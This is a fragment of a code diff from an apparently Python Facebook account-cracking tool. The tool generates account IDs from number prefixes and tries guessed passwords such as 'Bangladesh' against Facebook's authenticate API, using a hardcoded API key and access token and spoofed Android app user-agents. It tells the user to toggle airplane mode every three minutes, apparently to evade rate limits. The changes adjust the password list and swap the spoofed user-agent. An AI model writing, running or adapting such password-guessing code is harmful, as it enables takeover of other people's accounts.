@@ -161,7 +161,7 @@ def _bd_():
         print(f'{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{A}/{A}OFF{G1}]{G1} AIRPLANE MODE EVERY {A}3{G1} MIN');linex()
         for love in user:
             ids = code+name+cod+love
-            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'Bangladesh']
             sexy.submit(randm,ids,psd)
     print('')
     print(f'\r{A}──────────────────────────────────────────────────')
@@ -447,7 +447,7 @@ def randm(ids,psd):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
+            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]',
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
